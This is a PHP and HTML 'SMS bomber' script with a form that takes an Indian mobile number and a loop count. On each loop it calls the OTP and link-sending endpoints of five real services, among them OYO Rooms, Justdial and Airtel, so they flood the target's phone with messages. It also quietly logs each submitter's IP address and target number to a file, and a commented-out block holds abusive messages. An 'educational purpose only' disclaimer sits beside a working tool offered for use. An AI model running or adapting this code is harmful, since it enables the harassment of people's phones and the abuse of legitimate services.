<html>
<body>
<form action="pokkt.php" method="GET">
Number: <input type="text" name="no"><br>
L00P: <input type="text" name="l"><br>
<br><b>Put the 10 digit Mobile Number "Without" any prefix 91 or +91<br>Remember it will start bombing as you Submit.. and will be 3 times you enter the l00p.. :D </b> <br>THIS IS ONLY FOR EDUCATIONAL PURPOSE ONLY. TRY AT YOUR OWN RISK.&nbsp;<div>WE WILL LOG YOUR IP AND DETAIL.&nbsp;</div><div>WE ARE NOT RESPONSIBLE FOR ANY DAMAGE. </div>
<button type="submit" class="btn btn-danger" onclick="ajaxRequest(0);">ho jaa shuru... :v  </button>
</form>
</body>
</html> 
<?php


$no = $_GET['no'];
$l = $_GET['l'];

#web service to encrypt the password (which accepts the JSON data and returns the result in JSON format)
$url	= 'https://pokketdeal.com/lokiapp/otp/';
$data = array(
	'phone_number' => $no
);
$content = json_encode($data);

$url1 = 'https://www.oyorooms.com/v2/users/generate_otp?phone='.$no.'&country_code=+91&version=33';

$url2 = 'http://www.justdial.com/functions/ajxandroid.php?phn='.$no.'&vcode=-&type=1&applink=android&apppage=';

$url3 = 'http://www.quackquack.in/app/sendlink.php';

$data3 = array(
	'mobile' => $no
);

$url4 = 'https://www.airtel.in/myaccount/NavigationApp?num='.$no;

if ($no)
{
/***
   if($l == 2)
   {
    $ip = getenv("REMOTE_ADDR");
    $date = date("d") . ":" . date("F") . ":" . date("Y");
    $data2 = $l . ".)  " . $ip . "  ::  " . $date . "  :::  Mobile No : " . $no . PHP_EOL;
    file_put_contents('log2222.txt', $data2, FILE_APPEND);
   echo 'Fuck! You Asshole';
   echo '<script>alert("Go n Fuck with with the toy..")</script>';
   die();
   }
**/
    $ip = getenv("REMOTE_ADDR");
    $date = date("d") . ":" . date("F") . ":" . date("Y");
    $data2 = $l . ".)  " . $ip . "  ::  " . $date . "  :::  Mobile No : " . $no . PHP_EOL;
    file_put_contents('logger.txt', $data2, FILE_APPEND);
 /*
   if($no == 'mynum')
   {
   echo 'Fuck! You Asshole';
   echo '<script>alert("Go n Fuck with with the toy..")</script>';
   die();
   }
   */
   if(strlen($no) != 10)
   {

   echo 'Failed!! Enter 10 Digit Number and Try again!';
   echo '<script>alert("Enter 10 digit Mobile Number")</script>';

   die();
   }

for($i=1;$i<=$l;$i++)
{

//Pokkt
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER,
		array("Content-type: application/json"));
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); //curl error SSL certificate problem, verify that the CA cert is OK

$result		= curl_exec($curl);

//OYO
$curl1 = curl_init($url1);
curl_setopt($curl1, CURLOPT_HEADER, false);
curl_setopt($curl1, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl1, CURLOPT_HTTPHEADER,
		array("Content-type: application/json"));
curl_setopt($curl1, CURLOPT_SSL_VERIFYPEER, false); //curl error SSL certificate problem, verify that the CA cert is OK

$result1		= curl_exec($curl1);

//justdail App

$curl2 = curl_init($url2);
curl_setopt($curl2, CURLOPT_HEADER, false);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl2, CURLOPT_HTTPHEADER,
		array("Content-type: application/json"));
curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false); //curl error SSL certificate problem, verify that the CA cert is OK

$result2		= curl_exec($curl2);



//quackquack
$curl3 = curl_init($url3);
curl_setopt($curl3, CURLOPT_HEADER, false);
curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl3, CURLOPT_POST, true);
curl_setopt($curl3, CURLOPT_POSTFIELDS, $data3);
curl_setopt($curl3, CURLOPT_SSL_VERIFYPEER, false); //curl error SSL certificate problem, verify that the CA cert is OK

$result3		= curl_exec($curl3);

$curl4 = curl_init($url4);
curl_setopt($curl4, CURLOPT_HEADER, false);
curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl4, CURLOPT_SSL_VERIFYPEER, false); //curl error SSL certificate problem, verify that the CA cert is OK

$result4		= curl_exec($curl4);

echo "Bombed.<br>";

curl_close($curl);
curl_close($curl1);
curl_close($curl2);
curl_close($curl3);
curl_close($curl4);
}
}

?>    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
